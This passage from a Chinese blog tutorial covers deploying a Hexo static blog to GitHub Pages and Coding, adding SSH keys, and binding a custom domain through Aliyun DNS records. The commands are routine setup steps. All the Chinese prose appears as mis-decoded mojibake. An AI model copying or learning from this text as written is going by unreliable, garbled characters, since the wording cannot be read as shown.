#ç”Ÿæˆå‘å¸ƒç”¨çš„é™æ€é¡µé¢</span><br><span class="line">hexo s  #é‡å¯æœ¬åœ°æœåŠ¡å™¨</span><br></pre></td></tr></table></figure><p>åˆ·æ–°åˆšæ‰çš„ç½‘å€ï¼š<a href="http://localhost:4000/">http://localhost:4000</a> ï¼Œå¯ä»¥çœ‹åˆ°æ›´æ–°åçš„ä¸»é¢˜é¡µé¢ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/hexo_butterfly_review.png"></p><p>æ›´å¤šç»†èŠ‚è®¾ç½®ï¼Œå¦‚èœå•æ ï¼ŒèƒŒæ™¯å›¾ç‰‡ï¼Œä»£ç æ ¼å¼ç­‰ç­‰ï¼Œå¯ä»¥å‚è€ƒButterflyçš„<a href="https://jerryc.me/posts/21cfbf15">æ–‡æ¡£</a>æ¥é…ç½®ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><p>å°ç«™è¿˜åœ¨é­”æ”¹ä¸­â€¦ï¼ˆå…·ä½“å¯å‚è€ƒå‹é“¾ä¸­çš„å¤§ä½¬åšå®¢ï¼Œè¿™é‡Œå°±ä¸é€ è½®å­äº†ï¼‰</p><h1 id="éƒ¨ç½²åˆ°Github"><a href="#éƒ¨ç½²åˆ°Github" class="headerlink" title="éƒ¨ç½²åˆ°Github"></a>éƒ¨ç½²åˆ°Github</h1><blockquote><p>æˆªæ­¢ç›®å‰ï¼Œå·²ç»<strong>æˆåŠŸå®‰è£…å¥½äº†ä¸€ä¸ªåˆå§‹åŒ–çš„Hexoåšå®¢</strong>ã€‚ä½†æ˜¯æš‚æ—¶è¿˜åªèƒ½åœ¨è‡ªå·±ç”µè„‘ä¸Šçœ‹åˆ°ï¼Œå¦‚ä½•è®©åˆ«äººé€šè¿‡åŸŸåå¯ä»¥è®¿é—®åˆ°å‘¢ï¼Ÿæ¥ä¸‹æ¥å°±è¦è¯·å‡ºä»Šå¤©çš„å¦å¤–ä¸€ä½ä¸»è§’<strong>GitHub Pages</strong>äº†ã€‚<br>å¦å¤–ï¼Œä»¥ä¸Šçš„å®‰è£…æ­¥éª¤ä¹Ÿå¯å‚è€ƒ<a href="https://link.jianshu.com/?t=https://hexo.io/zh-cn/docs/index.html">Hexoå®˜æ–¹æ–‡æ¡£</a>ï¼Œå…³äºå„å‘½ä»¤æœ‰æ›´è¯¦ç»†çš„è§£é‡Šã€‚</p></blockquote><h2 id="åˆ›å»ºGithubä»“åº“"><a href="#åˆ›å»ºGithubä»“åº“" class="headerlink" title="åˆ›å»ºGithubä»“åº“"></a>åˆ›å»ºGithubä»“åº“</h2><p>è¿™é‡Œå‡è®¾å·²ç»æ³¨å†Œè¿‡äº†Githubå¸æˆ·ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯ä»¥å»<a href="https://github.com/">Github</a>æ³¨å†Œã€‚</p><p>æ³¨å†Œå¥½äº†åï¼Œç™»å½•Github,åˆ›å»ºä»“åº“ï¼šç‚¹å‡»å³ä¸Šè§’çš„+å·ï¼Œé€‰æ‹©new repository</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/4iLYFGOtm1r3NRc.png" alt="image-20210130233629330"></p><p>å°†ä»“åº“åè®¾ç½®ä¸º <code>username.github.io</code> ,<strong>å…¶ä¸­,usernameè¯·å¯¹åº”æ¢æˆä½ çš„githubç”¨æˆ·åã€‚</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/QR7uxPLNHyA1GWo.png" alt="image-20210130234029747"></p><h2 id="æ·»åŠ SSHå…¬é’¥"><a href="#æ·»åŠ SSHå…¬é’¥" class="headerlink" title="æ·»åŠ SSHå…¬é’¥"></a>æ·»åŠ SSHå…¬é’¥</h2><p>å¦‚æœç¬¬ä¸€æ¬¡ä½¿ç”¨gitçš„è¯ï¼Œéœ€è¦è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;your username&quot;</span><br><span class="line">git config --global user.email &quot;your email&quot;</span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°çš„â€your usernameâ€æ¢æˆè‡ªå·±çš„çœŸå®ç”¨æˆ·å,â€your emailâ€æ¢æˆçœŸå®çš„emailã€‚</p><p>ç„¶åï¼Œç”Ÿæˆå…¬é’¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>åœ¨Cç›˜/ç”¨æˆ·/ç”¨æˆ·å/.sshç›®å½•ä¸‹æ‰¾åˆ°<code>id_rsa.pub</code>æ–‡ä»¶,ç”¨æ–‡æœ¬ç¼–è¾‘å·¥å…·æ‰“å¼€ï¼Œå¹¶å¤åˆ¶æ‰€æœ‰æ–‡æœ¬å†…å®¹ã€‚åœ¨Githubé¡µé¢å³ä¸Šè§’ï¼Œç‚¹å‡»ç”¨æˆ·å¤´åƒ-Settings-SSH and GPG keys-New SSH key</p><p>æŠŠå¤åˆ¶çš„å…¬é’¥æ–‡æœ¬å†…å®¹ç²˜è´´åˆ°Keyä¸­ï¼Œä¸Šæ–¹çš„Titleå¯éšæ„å¡«å†™</p><p>æ·»åŠ å®Œæˆåå¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>å¦‚æœé…ç½®æˆåŠŸï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸçš„å›å¤ã€‚</p><h2 id="ä¸Šä¼ æ–‡ä»¶åˆ°Githubä»“åº“"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°Githubä»“åº“" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°Githubä»“åº“"></a>ä¸Šä¼ æ–‡ä»¶åˆ°Githubä»“åº“</h2><p>åœ¨é…ç½®æ–‡ä»¶<code>_config.yml</code>ä¸­æ·»åŠ ä»“åº“ä¿¡æ¯:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: #ä½ çš„ä»“åº“åœ°å€,å¦‚:https://github.com/wawyw/wawyw.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>ç›´æ¥é€šè¿‡hexoæ¥å‘å¸ƒåˆ°githubï¼Œéœ€è¦å®‰è£…ä»¥ä¸‹æ’ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>å®‰è£…æˆåŠŸåï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d   #ç”Ÿæˆä¸€ä¸ª.deploy_gitçš„æ–‡ä»¶å¤¹ï¼Œå¹¶æŠŠæœ¬åœ°ç”Ÿæˆçš„é™æ€æ–‡ä»¶éƒ¨ç½²Githubä»“åº“ä¸­çš„masteråˆ†æ”¯ä¸Š</span><br></pre></td></tr></table></figure><p>åˆ·æ–°githubå¯¹åº”çš„repositoryé¡µé¢ï¼Œå³å¯çœ‹åˆ°æäº¤çš„å†…å®¹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/KUetpmHJ9PxB1oa.png" alt="image-20210130235436880"></p><h2 id="é…ç½®é™æ€ç«™ç‚¹"><a href="#é…ç½®é™æ€ç«™ç‚¹" class="headerlink" title="é…ç½®é™æ€ç«™ç‚¹"></a>é…ç½®é™æ€ç«™ç‚¹</h2><p>ç‚¹å‡»Settings, è¿›å…¥GitHub Pagesé…ç½®ï¼Œç”±äºä¹‹å‰æ–°å»ºä»“åº“çš„æ—¶å€™ï¼Œä»“åº“åä¸ºusername.github.ioï¼Œgithubå·²ç»è‡ªå·±ä¸ºæˆ‘ä»¬å‘å¸ƒäº†é™æ€çš„é¡µé¢ã€‚å¦‚æœä¸æ˜¯username.github.ioçš„æ ¼å¼ï¼Œåˆ™éœ€è¦æ‰‹åŠ¨é…ç½®ã€‚</p><p>ä¹‹ååœ¨æµè§ˆå™¨ä¸­è¾“å…¥<code>username.github.io</code>ï¼ˆå¯èƒ½ä½ å·²ç»å‘ç°äº†ï¼Œè¿™ä¸ªå°±æ˜¯ä¹‹å‰æ–°å»ºä»“åº“çš„åå­—ï¼ŒåŒæ—¶ä¹Ÿæ˜¯åšå®¢çš„åŸŸåï¼‰ï¼Œæ²¡æ¯›ç—…çš„è¯ï¼Œåº”è¯¥å¯ä»¥å†æ¬¡çœ‹åˆ°é‚£ä¸ªç†Ÿæ‚‰åˆäº²åˆ‡çš„åšå®¢é¡µé¢äº†ã€‚</p><blockquote><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»é€šè¿‡Hexoåˆ›å»ºäº†ä¸€ä¸ªæœ€åŸå§‹çš„åšå®¢ï¼Œå¹¶ä¸”é€šè¿‡æŠŠåšå®¢é™æ€æ–‡ä»¶æ”¾åˆ°GitHubçš„ä»“åº“ä¸­ï¼Œå®ç°äº†ä»ç½‘ä¸Šä»¥GitHubçš„é»˜è®¤åŸŸåè®¿é—®è¿™ä¸ªåšå®¢ã€‚</p><p>å¦‚æœéœ€è¦ä¸ªæ€§åŒ–åŸŸåï¼Œåˆ™éœ€è¦ç”³è¯·å¯¹åº”çš„åŸŸåå¹¶ç»‘å®šåˆ°Githubä¸Šã€‚</p><p>å› ä¸ºGithubç”¨çš„æ˜¯å›½å¤–çš„æœåŠ¡å™¨ï¼Œç«™ç‚¹åŠ è½½é€Ÿåº¦å¯èƒ½è¾ƒæ…¢ï¼Œå¯è€ƒè™‘ä½¿ç”¨GitHub+codingåŒæ‰˜ç®¡åšå®¢ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå›½å†…è®¿é—®codingçš„æœåŠ¡å™¨ï¼Œå›½å¤–è®¿é—®GitHubçš„æœåŠ¡å™¨ï¼Œä»¥æå‡å›½å†…è®¿é—®åšå®¢çš„é€Ÿåº¦ã€‚</p></blockquote><h1 id="éƒ¨ç½²åˆ°Coding"><a href="#éƒ¨ç½²åˆ°Coding" class="headerlink" title="éƒ¨ç½²åˆ°Coding"></a>éƒ¨ç½²åˆ°Coding</h1><h2 id="åˆ›å»ºCodingä»“åº“"><a href="#åˆ›å»ºCodingä»“åº“" class="headerlink" title="åˆ›å»ºCodingä»“åº“"></a>åˆ›å»ºCodingä»“åº“</h2><p>åŒæ ·ï¼Œå…ˆ<a href="https://coding.net/">å®˜ç½‘æ³¨å†Œ</a></p><p>é€‰æ‹©é¡¹ç›®ï¼Œæ–°å»ºä¸€ä¸ªä»£ç æ‰˜ç®¡é¡¹ç›®<img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/kFH5Y7sBDtJd6ZO.png" alt="image-20210202114025032"></p><p>å¡«å†™å®Œé¡¹ç›®åŸºæœ¬ä¿¡æ¯åï¼Œå®Œæˆåˆ›å»º</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Gvh47RtmBHxTCwJ.png" alt="image-20210202114214799"></p><h2 id="æ·»åŠ SSHå…¬é’¥-1"><a href="#æ·»åŠ SSHå…¬é’¥-1" class="headerlink" title="æ·»åŠ SSHå…¬é’¥"></a>æ·»åŠ SSHå…¬é’¥</h2><p>æ‰¾åˆ°ä¹‹å‰éƒ¨ç½²åˆ°Githubæ—¶ç”Ÿæˆçš„<code>id_rsa.pub</code> æ–‡ä»¶ï¼Œå¤åˆ¶å…¶å†…å®¹ã€‚</p><p>æ‰“å¼€Codingçš„<code>ä¸ªäººè®¾ç½®</code>ï¼Œ<code>SSHå…¬é’¥</code>ï¼Œæ·»åŠ å…¬é’¥ï¼Œåç§°è‡ªå®šï¼Œç²˜è´´åˆšæ‰å¤åˆ¶çš„å…¬é’¥ï¼Œæ·»åŠ å¥½åå¦‚ä¸‹å›¾ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yTJ34V9SzZxYuNr.png" alt="image-20210202114643411"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/czZBXJvNPqYMoiQ.png" alt="image-20210202115022080"></p><h2 id="ä¸Šä¼ æ–‡ä»¶åˆ°Codingä»“åº“"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°Codingä»“åº“" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°Codingä»“åº“"></a>ä¸Šä¼ æ–‡ä»¶åˆ°Codingä»“åº“</h2><p>æ‰“å¼€æ–°å»ºçš„ä»“åº“ï¼Œç‚¹å‡»å…‹éš†â¡æ¨¡å¼é€‰sshâ¡å¤åˆ¶åœ°å€ï¼Œå°†ä»“åº“é“¾æ¥æ·»åŠ åˆ°ç«™ç‚¹çš„é…ç½®æ–‡ä»¶ <code>_config.yml</code> ä¸­</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8RJeOF6nyjUsrbi.png" alt="image-20210202115328829"></p><p>ä¿®æ”¹å®Œä¹‹å <code>hexo d</code> éƒ¨ç½²å°±ä¼šå°† public ç›®å½•æ¨é€åˆ° Coding ä¸Šåšå®¢ä»“åº“çš„ master åˆ†æ”¯ã€‚éƒ¨ç½²åä»“åº“å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ExJgFdcnDqHbXyQ.png" alt="image-20210202115530532"></p><h2 id="é…ç½®é™æ€ç«™ç‚¹-1"><a href="#é…ç½®é™æ€ç«™ç‚¹-1" class="headerlink" title="é…ç½®é™æ€ç«™ç‚¹"></a>é…ç½®é™æ€ç«™ç‚¹</h2><p>æŠŠåšå®¢ä¸Šä¼ éƒ¨ç½²åˆ°ä»“åº“åï¼Œæˆ‘ä»¬è¿˜è¦åœ¨Codingç”Ÿæˆé™æ€é¡µé¢ã€‚</p><p>è¿›å…¥ä»“åº“ï¼Œè¿›å…¥<code>é¡¹ç›®è®¾ç½®</code><strong>ï¼ˆæ³¨æ„è¿™ä¸ªåœ¨å·¦ä¸‹è§’ï¼‰</strong>ï¼Œ<code>é¡¹ç›®ä¸æˆå‘˜</code>ï¼Œå³ä¾§<code>åŠŸèƒ½å¼€å…³</code>ï¼Œå¼€å¯ <code>æŒç»­éƒ¨ç½²</code>å³å¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/hw39alxYncKVSiv.png" alt="image-20210202115821544"></p><p>å¼€å¯åå°±ä¼šåœ¨ä»“åº“çš„å·¦ä¾§çœ‹åˆ°æ­¤åŠŸèƒ½ï¼Œç‚¹å‡»<code>é™æ€ç½‘ç«™</code>ï¼Œæ–°å»ºç½‘ç«™ï¼Œå¡«å†™ç½‘ç«™åç§°ï¼Œå…¶å®ƒé»˜è®¤ï¼Œä¿å­˜ã€‚</p><p>å¼€å¯æœåŠ¡åä¼šå‡ºç°è®¿é—®åœ°å€ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sz2NhSQv1c3UPJq.png" alt="image-20210202120139692"></p><p>è®¿é—®æ­¤åœ°å€åä¼šè·³è½¬åˆ°ä½ çš„åšå®¢é¦–é¡µã€‚ä¸GitHubéƒ¨ç½²ç±»ä¼¼ï¼Œæ­¤ç½‘å€ç›¸å½“äºä½ åšå®¢çš„å¦ä¸€ä¸ªè®¿é—®åœ°å€ã€‚æˆ‘ä»¬åé¢è¦æŠŠæ‰€æœ‰çš„è¿™äº›ç½‘å€éƒ½è§£æåˆ°åŒä¸€ä¸ªåŸŸåä¸Šã€‚</p><h1 id="ç»‘å®šä¸ªäººåŸŸå"><a href="#ç»‘å®šä¸ªäººåŸŸå" class="headerlink" title="ç»‘å®šä¸ªäººåŸŸå"></a>ç»‘å®šä¸ªäººåŸŸå</h1><blockquote><p>é…ç½®å¥½Githubå’ŒCodingçš„é™æ€é¡µé¢åï¼Œå·²ç»å¯ä»¥é€šè¿‡ç»™å®šçš„ç½‘å€è®¿é—®åˆ°åšå®¢é¡µé¢äº†ã€‚å¦‚æœéœ€è¦ä¸ªæ€§åŒ–åŸŸåï¼Œåˆ™éœ€è¦ç”³è¯·å¯¹åº”çš„åŸŸåå¹¶ç»‘å®šåˆ°Githubå’ŒCodingä¸Šã€‚</p></blockquote><h2 id="æ³¨å†ŒåŸŸå"><a href="#æ³¨å†ŒåŸŸå" class="headerlink" title="æ³¨å†ŒåŸŸå"></a>æ³¨å†ŒåŸŸå</h2><p>æ³¨å†ŒåŸŸåçš„å¹³å°æœ‰å¾ˆå¤šå¯ä»¥é€‰æ‹©ï¼Œè¿™é‡Œä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ã€‚</p><p>æ¥åˆ°<a href="https://wanwang.aliyun.com/domain/">ä¸‡ç½‘å¹³å°</a>ï¼ŒæŸ¥è¯¢å¯æ³¨å†Œçš„åŸŸå</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1euIfLRiU6JWCr4.png" alt="image-20210202122045985"></p><p>æŒ‘é€‰å–œæ¬¢çš„åŸŸåï¼ŒåŠ å…¥æ¸…å•â†’ç«‹å³ç»“ç®—â†’ç«‹å³è´­ä¹°</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/LjRiADB5tTsnMzV.png" alt="image-20210202122234878"></p><blockquote><p>è¿™é‡Œé€‰æ‹©çš„æ˜¯<code> .top</code> åŸŸåï¼Œä½ æ‡‚çš„ğŸ˜‚</p></blockquote><h2 id="è§£æåŸŸå"><a href="#è§£æåŸŸå" class="headerlink" title="è§£æåŸŸå"></a>è§£æåŸŸå</h2><p>ç™»å½•<a href="https://homenew.console.aliyun.com/home/dashboard/ProductAndService">é˜¿é‡Œäº‘çš„æ§åˆ¶å°</a>ï¼Œç‚¹å‡»å·¦ä¾§èœå•-åŸŸåï¼Œè¿›å…¥åŸŸåç®¡ç†é¡µé¢ã€‚</p><p>åœ¨åŸŸååˆ—è¡¨ä¸­ï¼Œæ‰¾åˆ°éœ€è¦è§£æçš„åŸŸåï¼Œç‚¹å‡»å¯¹åº”çš„è§£ææŒ‰é’®ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/bQ8rnTtdPepaWS7.png" alt="image-20210202123116868"></p><p>ç‚¹å‡»â€æ·»åŠ è®°å½•â€</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8gGsqTyaJvHZpO7.png" alt="image-20210202123225340"></p><h3 id="è§£æ-Github"><a href="#è§£æ-Github" class="headerlink" title="@è§£æ-Github"></a>@è§£æ-Github</h3><p>åœ¨cmdçª—å£ä¸­ï¼Œpingä¸€ä¸‹ä¹‹å‰é…ç½®çš„Githunçš„é™æ€é¡µé¢åœ°å€</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/oeJlf2GacxBF7QT.png" alt="image-20210202123556068"></p><p>å¯ä»¥è·å–åˆ°å¯¹åº”çš„ipåœ°å€</p><p>æ·»åŠ è®°å½•ç¼–è¾‘å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/MDpf4OdtBhJwT18.png" alt="image-20210202124304317"></p><ul><li>è®°å½•ç±»å‹é€‰æ‹©Aï¼Œæ·»åŠ  A è®°å½•å¯å®ç°å°†åŸŸåæŒ‡å‘ IP åœ°å€ã€‚</li><li>ä¸»æœºè®°å½•è¾“å…¥@ï¼Œä¸€èˆ¬æ˜¯æŒ‡å­åŸŸåçš„å‰ç¼€ï¼ˆå¦‚éœ€åˆ›å»ºå­åŸŸåä¸º<a href="http://www.dns-example.com/">www.dns-example.com</a>, ä¸»æœºè®°å½•è¾“å…¥ <strong>www</strong>ï¼›å¦‚éœ€å®ç°dns-example.comï¼Œä¸»æœºè®°å½•è¾“å…¥ **@**ï¼‰</li><li>è§£æçº¿è·¯é€‰æ‹©å¢ƒå¤–,å› ä¸ºæˆ‘ä»¬æ˜¯å‡†å¤‡å›½å†…è®¿é—®æ—¶è®¿é—®åˆ°Codingï¼Œå›½å¤–è®¿é—®æ—¶è®¿é—®åˆ°Github</li><li>è®°å½•å€¼è¾“å…¥åˆšæ‰è·å–åˆ°çš„ipåœ°å€,å¦‚:185.199.110.153</li></ul><h3 id="wwwè§£æ-Github"><a href="#wwwè§£æ-Github" class="headerlink" title="wwwè§£æ-Github"></a>wwwè§£æ-Github</h3><p>æ·»åŠ è®°å½•ç¼–è¾‘å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/GrqatcWw3FdnSmz.png" alt="image-20210202124929421"></p><ul><li>è®°å½•ç±»å‹é€‰æ‹©CNAME,æ·»åŠ  CNAME è®°å½•å¯å®ç°å°†åŸŸåæŒ‡å‘å¦å¤–ä¸€ä¸ªåŸŸåã€‚</li><li>ä¸»æœºè®°å½•è¾“å…¥www</li><li>è§£æçº¿è·¯é€‰æ‹©å¢ƒå¤–</li><li>è®°å½•å€¼å°±è¾“å…¥Githubçš„é™æ€é¡µé¢åœ°å€,å³ wawyw.github.io</li></ul><h3 id="è§£æ-Coding"><a href="#è§£æ-Coding" class="headerlink" title="@è§£æ-Coding"></a>@è§£æ-Coding</h3><p>åœ¨cmdçª—å£ä¸­ï¼Œpingä¸€ä¸‹ä¹‹å‰é…ç½®çš„Codingçš„é™æ€é¡µé¢åœ°å€</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yt3M4K8bj7sFSHk.png" alt="image-20210202125402543"></p><p>å¯ä»¥è·å–åˆ°å¯¹åº”çš„ipåœ°å€</p><p>æ·»åŠ è®°å½•ç¼–è¾‘å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SYh8u9rwLUNixpD.png" alt="image-20210202125550187"></p><ul><li>è®°å½•ç±»å‹é€‰æ‹©A</li><li>ä¸»æœºè®°å½•è¾“å…¥@</li><li>è§£æçº¿è·¯é€‰æ‹©é»˜è®¤</li><li>è®°å½•å€¼è¾“å…¥åˆšæ‰è·å–åˆ°çš„ipåœ°å€,å¦‚:124.156.144.32</li></ul><h3 id="wwwè§£æ-Coding"><a href="#wwwè§£æ-Coding" class="headerlink" title="wwwè§£æ-Coding"></a>wwwè§£æ-Coding</h3><p>æ·»åŠ è®°å½•ç¼–è¾‘å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SeVBI1XAzavonUT.png" alt="image-20210202125909957"></p><ul><li>è®°å½•ç±»å‹é€‰æ‹©CNAME</li><li>ä¸»æœºè®°å½•è¾“å…¥www</li><li>è§£æçº¿è·¯é€‰æ‹©é»˜è®¤</li><li>è®°å½•å€¼å°±è¾“å…¥Codingçš„é™æ€é¡µé¢åœ°å€</li></ul><p>æœ€åé…ç½®å®Œæˆå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fYBiz2cT3FkqdEX.png" alt="image-20210202130137863"></p><h2 id="ç»‘å®šåŸŸå"><a href="#ç»‘å®šåŸŸå" class="headerlink" title="ç»‘å®šåŸŸå"></a>ç»‘å®šåŸŸå</h2><h3 id="GithubåŸŸåç»‘å®š"><a href="#GithubåŸŸåç»‘å®š" class="headerlink" title="GithubåŸŸåç»‘å®š"></a>GithubåŸŸåç»‘å®š</h3><p>åœ¨é¡¹ç›®æ ¹ç›®å½•-sourceç›®å½•ä¸‹ï¼Œæ–°å»ºCNAMEæ–‡ä»¶,å†…å®¹è¾“å…¥å‰é¢ç”³è¯·çš„åŸŸåï¼Œå¦‚:<a href="http://www.wawyw.top/">www.wawyw.top</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/64joLQzHBKOqmiE.png" alt="image-20210202130504760"></p><p>ä¸Šä¼ åˆ°Githubå’ŒCodingçš„ä»“åº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åå°±å¯ä»¥åœ¨Githubå’ŒCodingå¯¹åº”çš„é¡¹ç›®æ ¹ç›®å½•ä¸‹å‘åˆ°æäº¤åˆ°çš„CNAMEæ–‡ä»¶ã€‚</p><p>ç”±äºæäº¤äº†CNAMEæ–‡ä»¶ï¼ŒGithubçš„é™æ€é¡µé¢æœåŠ¡å·²ç»è‡ªåŠ¨ç»‘å®šäº†æ–°æäº¤çš„åŸŸå</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8F6tvVLCE7eWqKl.png" alt="image-20210202130924470"></p><p>è¿™æ—¶ï¼Œå°±å¯ä»¥ç”¨ä¸Šé¢è‡ªå®šä¹‰çš„åŸŸåè®¿é—®æˆ‘ä»¬çš„åšå®¢äº†ã€‚</p><h3 id="CodingåŸŸåç»‘å®š"><a href="#CodingåŸŸåç»‘å®š" class="headerlink" title="CodingåŸŸåç»‘å®š"></a>CodingåŸŸåç»‘å®š</h3><p>å›åˆ°Codingä»“åº“çš„é™æ€ç½‘ç«™è®¾ç½®é¡µé¢ï¼Œé€‰æ‹©è‡ªå®šä¹‰åŸŸåâ†’æ–°å»ºåŸŸå</p><blockquote><p><strong>æ³¨æ„</strong>ï¼šä¸€å®šè¦æ·»åŠ ä¸¤æ¡ï¼Œä¸€æ¡å¸¦<code>www.</code>çš„ï¼Œä¸€æ¡ä¸å¸¦<code>www.</code>çš„</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/8oD2RBig7FwLpGV.png" alt="image-20210202135629358"></p><p>æ·»åŠ åä¼šç»™å‡ºä¸¤æ¡CNAMEè®°å½•ï¼Œéœ€è¦å›åˆ°é˜¿é‡Œäº‘æ§åˆ¶å°çš„è§£æè®¾ç½®ä¸­ä¿®æ”¹å¯¹åº”çš„è®°å½•å€¼</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/2RzO14uBefParJl.png" alt="image-20210202135944688"></p><blockquote><p>OKï¼ç°åœ¨æˆ‘ä»¬å°±ç®—å®Œæˆäº†GitHub+CodingåŒæ‰˜ç®¡åšå®¢äº†</p><p>è¿™æ ·å›½å†…çš„ç”¨æˆ·è®¿é—®çš„å°±æ˜¯codingä¸Šéƒ¨ç½²çš„åšå®¢ï¼Œè€Œå›½å¤–çš„ç”¨æˆ·è®¿é—®çš„å°±æ˜¯githubä¸Šéƒ¨ç½²çš„åšå®¢</p></blockquote><h2 id="å›½å†…æµ‹é€Ÿå¯¹æ¯”"><a href="#å›½å†…æµ‹é€Ÿå¯¹æ¯”" class="headerlink" title="å›½å†…æµ‹é€Ÿå¯¹æ¯”"></a>å›½å†…æµ‹é€Ÿå¯¹æ¯”</h2><p>æµ‹é€Ÿç½‘ç«™ï¼š<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p><strong>å›½å†…è®¿é—®GitHubæœåŠ¡å™¨ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qeJIVuBFfsxjygP.png" alt="image-20210202170104490"></p><p><strong>å›½å†…è®¿é—®CodingæœåŠ¡å™¨ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/fWmNrIyg17Ab9ih.png" alt="image-20210202171245483"></p><blockquote><p>ä¸€å¯¹æ¯”æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°CodingæœåŠ¡å™¨åœ¨å›½å†…è®¿é—®å¿«å¤šäº†ï¼Œè€ŒGitHubæœåŠ¡å™¨åœ¨å›½å†…è®¿é—®æœ‰å¾ˆå¤šéƒ½æ˜¯è¶…æ—¶ï¼Œé€Ÿåº¦æå‡è¾ƒæ˜æ˜¾ã€‚</p></blockquote><p>ä¸è¿‡ï¼Œåœ¨åé¢ä½“éªŒè¿‡CDNåŠ é€Ÿåï¼Œè¿™åˆç®—å¾—äº†å•¥ï¼Œå…ˆä¸Šå›¾</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/o5CnxDYNiMLIjSy.png" alt="image-20210207002805836"></p><p>è¿™é‡Œé€‰æ‹©äº†è…¾è®¯äº‘çš„CDNåŠ é€ŸæœåŠ¡ï¼Œæ–°ç”¨æˆ·å¯ä»¥ç™½å«–6ä¸ªæœˆçš„æµé‡å“Ÿã€‚åˆæ‹äº‘çš„CDNä¹Ÿä¸é”™ï¼Œæ›´å¤šè¯¦æƒ…å¯ä»¥å»å®˜ç½‘äº†è§£ã€‚ï¼ˆå‰æè¦åšå¥½ç½‘ç«™çš„å¤‡æ¡ˆå·¥ä½œï¼‰</p><h1 id="å†™åšå®¢"><a href="#å†™åšå®¢" class="headerlink" title="å†™åšå®¢"></a>å†™åšå®¢</h1><p>åˆ›å»ºé¡µé¢å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page page_name</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨<code>source/_posts</code> 